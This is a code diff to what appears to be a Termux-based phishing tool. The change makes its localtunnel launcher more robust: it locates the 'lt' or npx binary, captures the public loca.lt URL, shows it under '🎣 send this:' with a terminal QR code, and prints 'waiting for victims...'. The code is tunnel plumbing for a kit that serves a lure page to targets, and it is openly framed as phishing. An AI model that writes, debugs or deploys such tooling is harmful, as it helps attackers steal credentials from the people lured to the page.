@@ -202,38 +202,62 @@ def assets(filename):
     return redirect("/")
 
 # ---------- tunneling ----------
-def lt_bin():
-    for cand in [os.path.join(BASE_DIR, "node_modules", ".bin", "lt"),
-                 "/data/data/com.termux/files/usr/bin/lt", "lt"]:
-        if os.path.exists(cand):
-            return cand
-    return "lt"
+def lt_cmd(port):
+    """return the best available localtunnel command, or None"""
+    import shutil
+    cands = [
+        [os.path.join(BASE_DIR, "node_modules", ".bin", "lt")],
+        ["/data/data/com.termux/files/usr/bin/lt"],
+        [shutil.which("lt") or ""],
+        [shutil.which("npx") or "", "localtunnel"],
+    ]
+    for base in cands:
+        if base[0] and os.path.exists(base[0]):
+            return base + ["--port", str(port)]
+    return None
 
 def start_tunnel(port):
+    cmd = lt_cmd(port)
+    if not cmd:
+        print(f"{R}[!] localtunnel not found on this device.")
+        print(f"    termux fix: {W}pkg install nodejs && npm install -g localtunnel{N}")
+        print(f"    or run:     {W}bash install.sh{N}")
+        sys.exit(1)
+
     done = threading.Event()
     t = threading.Thread(target=spinner,
                          args=(f"establishing localtunnel on :{port}...", done),
                          daemon=True)
     t.start()
-    proc = subprocess.Popen(
-        [lt_bin(), "--port", str(port)],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, text=True)
+    except Exception as e:
+        done.set(); t.join()
+        print(f"{R}[!] failed to spawn tunnel: {e}{N}")
+        sys.exit(1)
+
     url_found = None
+    raw_output = []
     start = time.time()
-    for line in proc.stdout:
+    while time.time() - start < 60:
+        line = proc.stdout.readline()
+        if not line:
+            if proc.poll() is not None:
+                break  # process died
+            continue
+        raw_output.append(line.strip())
         # localtunnel prints: "your url is: https://xyz.loca.lt"
         m = re.search(r"https://[a-z0-9-]+\.loca\.lt", line)
         if m:
             url_found = m.group(0)
             break
-        if time.time() - start > 30:
-            break
     done.set(); t.join()
+
     if url_found:
         STATE["tunnel_url"] = url_found
         typewrite(f"{G}[+] tunnel established{N}", 0.015)
         print(f"\n  {W}🎣 send this:{N}  {C}{W}{url_found}{N}")
-        # qr code in terminal for mobile-to-mobile sharing
         try:
             import qrcode
             qr = qrcode.QRCode(border=1)
@@ -244,9 +268,14 @@ def start_tunnel(port):
             pass
         print(f"\n{Y}[*] waiting for victims... {D}(ctrl+c to stop){N}")
     else:
-        print(f"{R}[!] tunnel failed. is localtunnel installed?")
-        print(f"    termux: {W}npm install -g localtunnel{N}")
-        print(f"    or run: {W}bash install.sh{N}")
+        print(f"{R}[!] tunnel failed after 60s.{N}")
+        if raw_output:
+            print(f"{D}    lt said:{N}")
+            for l in raw_output[:5]:
+                print(f"{D}      {l}{N}")
+        else:
+            print(f"{D}    lt produced no output — check node/npm install{N}")
+        print(f"    manual test: {W}lt --port {port}{N}")
         sys.exit(1)
 
 # ---------- helpers ----------
